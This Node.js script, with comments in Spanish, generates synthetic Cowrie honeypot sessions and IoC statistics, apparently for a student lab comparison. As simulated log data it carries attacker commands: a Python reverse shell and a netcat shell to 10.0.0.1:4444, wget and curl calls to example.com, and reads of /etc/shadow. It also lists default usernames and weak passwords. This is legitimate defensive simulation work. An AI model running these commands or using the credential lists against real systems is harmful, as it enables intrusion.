#!/usr/bin/env node
/**
 * M3 — Generador de Datos Sintéticos para Comparación
 * ----------------------------------------------------
 * Genera datos ficticios realistas basados en los parámetros del proyecto
 * para comparación con el trabajo de un compañero.
 *
 * Uso:
 *   node scripts/m3_generar_sinteticos.js [--sessions 20] [--output comparacion.json]
 */

const fs = require('fs');
const path = require('path');

// ── Parse args ────────────────────────────────────────────────
const args = process.argv.slice(2);
let numSessions = 20;
let outputFile = 'comparacion_sintetica.json';

for (let i = 0; i < args.length; i++) {
  if (args[i] === '--sessions' && args[i+1]) numSessions = parseInt(args[++i]);
  if (args[i] === '--output' && args[i+1]) outputFile = args[++i];
}

// ── Parámetros realistas del proyecto ─────────────────────────
const ATTACK_IPS = [
  '45.33.32.156','185.220.101.34','193.142.30.77','62.210.105.116',
  '23.129.64.210','176.9.29.100','89.248.165.219','141.98.10.63',
  '51.159.115.233','185.56.83.83','91.132.147.230','77.247.181.163',
  '198.54.128.102','103.152.220.7','45.77.123.10','172.104.24.162',
  '139.162.166.30','209.141.55.18','178.62.197.203','128.199.148.161',
  '134.122.76.248','68.183.82.145','165.227.83.149','206.81.15.27',
  '45.32.128.203','104.248.41.37','167.172.57.43','129.213.82.174',
  '192.241.60.82','157.245.218.198'
];

const USERNAMES = [
  'admin','root','administrator','user','guest','test','oracle',
  'tomcat','postgres','mysql','www-data','ubuntu','operator',
  'backup','deploy','jenkins','git','docker','ansible','ec2-user'
];

const PASSWORDS = [
  '123456','admin','password','root','toor','admin123','test',
  'guest','12345678','qwerty','abc123','letmein','passw0rd',
  '111111','default','changeme','secret','master','1234','login'
];

const COMMANDS = [
  'whoami','id','uname -a','hostname','cat /etc/passwd','cat /etc/shadow',
  'ls -la /home','ls -la /tmp','netstat -an','ps aux','w','df -h',
  'wget http://example.com/payload','curl http://example.com/beacon',
  'chmod 777 /tmp','mkdir /tmp/.hidden','rm -rf /tmp/*','cd /tmp',
  'python -c "import os;os.system(\\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\\")"',
  'nc -e /bin/bash 10.0.0.1 4444','cat /proc/cpuinfo','free -m',
  'crontab -l','find / -perm -4000 2>/dev/null','cat /etc/ssh/sshd_config'
];

const COUNTRIES = [
  ['China',0.30],['Rusia',0.20],['Estados Unidos',0.12],
  ['Brasil',0.08],['India',0.06],['Vietnam',0.05],
  ['Indonesia',0.04],['Alemania',0.04],['Francia',0.03],
  ['Paises Bajos',0.03],['Otros',0.05]
];

// ── Helpers ───────────────────────────────────────────────────
function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

function weightedPick(weights) {
  const total = weights.reduce((s, w) => s + w[1], 0);
  let r = Math.random() * total;
  for (const [item, w] of weights) { r -= w; if (r <= 0) return item; }
  return weights[weights.length - 1][0];
}

function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

function isoTime(dt) { return dt.toISOString().replace(/\.\d{3}Z$/, 'Z'); }

function wilsonCI(successes, total) {
  if (total === 0) return [0, 0];
  const p = successes / total;
  const z = 1.96;
  const denom = 1 + z * z / total;
  const center = (p + z * z / (2 * total)) / denom;
  const spread = z * Math.sqrt((p * (1 - p) + z * z / (4 * total)) / total) / denom;
  return [Math.max(0, (center - spread) * 100), Math.min(100, (center + spread) * 100)];
}

// ── Generar sesión ────────────────────────────────────────────
function generateSession(sessionNum, startTime) {
  const srcIp = pick(ATTACK_IPS);
  const country = weightedPick(COUNTRIES);
  const protocol = pick(['ssh', 'telnet']);

  const events = [];
  const iocs = [];

  // Session connect
  const connectTime = new Date(startTime.getTime() + randInt(0, 5) * 1000);
  events.push({
    eventid: 'cowrie.session.connect',
    src_ip: srcIp,
    session: `ses${String(sessionNum).padStart(4, '0')}`,
    timestamp: isoTime(connectTime),
    country, protocol
  });

  iocs.push({ type: 'ip', value: srcIp, confidence: pick(['ALTO', 'MEDIO']), source: 'cowrie' });

  // Login attempts
  const nFailed = randInt(1, 8);
  const loginSuccess = Math.random() < 0.7;
  let t = new Date(connectTime);

  for (let i = 0; i < nFailed; i++) {
    t = new Date(t.getTime() + randInt(1, 5) * 1000);
    const user = pick(USERNAMES);
    const pass = pick(PASSWORDS);
    events.push({
      eventid: 'cowrie.login.failed',
      src_ip: srcIp,
      session: `ses${String(sessionNum).padStart(4, '0')}`,
      username: user, password: pass,
      timestamp: isoTime(t)
    });
    iocs.push({ type: 'credential', value: `${user}:${pass}`, confidence: 'MEDIO', source: 'cowrie' });
  }

  if (loginSuccess) {
    t = new Date(t.getTime() + randInt(1, 3) * 1000);
    events.push({
      eventid: 'cowrie.login.success',
      src_ip: srcIp,
      session: `ses${String(sessionNum).padStart(4, '0')}`,
      username: 'admin', password: 'test123',
      timestamp: isoTime(t)
    });

    // Commands
    const nCmd = randInt(2, Math.min(10, COMMANDS.length));
    const cmds = [...COMMANDS].sort(() => Math.random() - 0.5).slice(0, nCmd);

    for (const cmd of cmds) {
      t = new Date(t.getTime() + randInt(1, 4) * 1000);
      events.push({
        eventid: 'cowrie.command.input',
        src_ip: srcIp,
        session: `ses${String(sessionNum).padStart(4, '0')}`,
        input: cmd,
        timestamp: isoTime(t)
      });

      if (['wget', 'curl', 'nc', 'chmod', '/bin/bash', 'python'].some(kw => cmd.includes(kw))) {
        iocs.push({ type: 'command', value: cmd.slice(0, 500), confidence: 'ALTO', source: 'cowrie' });
      }
    }
  }

  // Session close
  t = new Date(t.getTime() + randInt(10, 120) * 1000);
  events.push({
    eventid: 'cowrie.session.closed',
    src_ip: srcIp,
    session: `ses${String(sessionNum).padStart(4, '0')}`,
    timestamp: isoTime(t),
    duration_ms: t.getTime() - connectTime.getTime()
  });

  return {
    session_id: `ses${String(sessionNum).padStart(4, '0')}`,
    src_ip: srcIp, country, protocol,
    login_success: loginSuccess,
    n_events: events.length,
    n_commands: events.filter(e => e.eventid === 'cowrie.command.input').length,
    events, iocs
  };
}

// ── Main ──────────────────────────────────────────────────────
console.log(`\nGenerando ${numSessions} sesiones sintéticas...\n`);

const sessions = [];
let startTime = new Date('2026-09-17T08:00:00Z');

for (let i = 1; i <= numSessions; i++) {
  sessions.push(generateSession(i, startTime));
  startTime = new Date(startTime.getTime() + randInt(3, 8) * 60 * 1000);
}

// Métricas
const totalSessions = sessions.length;
const totalEvents = sessions.reduce((s, ses) => s + ses.n_events, 0);
const totalIocs = sessions.reduce((s, ses) => s + ses.iocs.length, 0);
const uniqueIps = new Set(sessions.map(s => s.src_ip)).size;
const withAnyIoc = sessions.filter(s => s.iocs.length > 0).length;
const withCommandIoc = sessions.filter(s => s.iocs.some(i => i.type === 'command')).length;
const successfulLogins = sessions.filter(s => s.login_success).length;

const p3Amplio = (withAnyIoc / totalSessions * 100).toFixed(1);
const p3Comando = (withCommandIoc / totalSessions * 100).toFixed(1);
const p4 = (successfulLogins / totalSessions * 100).toFixed(1);
const ciP3A = wilsonCI(withAnyIoc, totalSessions).map(v => v.toFixed(1));
const ciP3C = wilsonCI(withCommandIoc, totalSessions).map(v => v.toFixed(1));
const ciP4 = wilsonCI(successfulLogins, totalSessions).map(v => v.toFixed(1));

const countryDist = {};
sessions.forEach(s => { countryDist[s.country] = (countryDist[s.country] || 0) + 1; });

const output = {
  metadata: {
    generated_at: new Date().toISOString(),
    total_sessions: numSessions,
    note: 'DATOS SINTÉTICOS para comparación. NO son datos reales del laboratorio.'
  },
  metrics: {
    total_sessions: totalSessions,
    total_events: totalEvents,
    total_iocs: totalIocs,
    unique_ips: uniqueIps,
    sessions_with_any_ioc: withAnyIoc,
    sessions_with_command_ioc: withCommandIoc,
    successful_logins: successfulLogins,
    p3_amplio_pct: parseFloat(p3Amplio),
    p3_amplio_ci95: ciP3A.map(Number),
    p3_comando_pct: parseFloat(p3Comando),
    p3_comando_ci95: ciP3C.map(Number),
    p4_pct: parseFloat(p4),
    p4_ci95: ciP4.map(Number),
    country_distribution: countryDist
  },
  sessions
};

const outDir = path.join(__dirname, '..', 'evidencia');
fs.mkdirSync(outDir, { recursive: true });
const outPath = path.join(outDir, outputFile);
fs.writeFileSync(outPath, JSON.stringify(output, null, 2), 'utf-8');

console.log('='.repeat(60));
console.log('RESUMEN DE DATOS SINTÉTICOS GENERADOS');
console.log('='.repeat(60));
console.log(`  Sesiones: ${totalSessions}`);
console.log(`  Eventos totales: ${totalEvents}`);
console.log(`  IoCs totales: ${totalIocs}`);
console.log(`  IPs únicas: ${uniqueIps}`);
console.log(`  Sesiones con IoC (amplio): ${withAnyIoc}/${totalSessions} = ${p3Amplio}% IC95%[${ciP3A[0]}%, ${ciP3A[1]}%]`);
console.log(`  Sesiones con IoC (comando): ${withCommandIoc}/${totalSessions} = ${p3Comando}% IC95%[${ciP3C[0]}%, ${ciP3C[1]}%]`);
console.log(`  Logins exitosos: ${successfulLogins}/${totalSessions} = ${p4}% IC95%[${ciP4[0]}%, ${ciP4[1]}%]`);
console.log(`\n  Países: ${JSON.stringify(countryDist)}`);
console.log(`\n  Archivo: ${outPath}`);
console.log('  (Los datos son SINTÉTICOS y se descartan después de la comparación)\n');
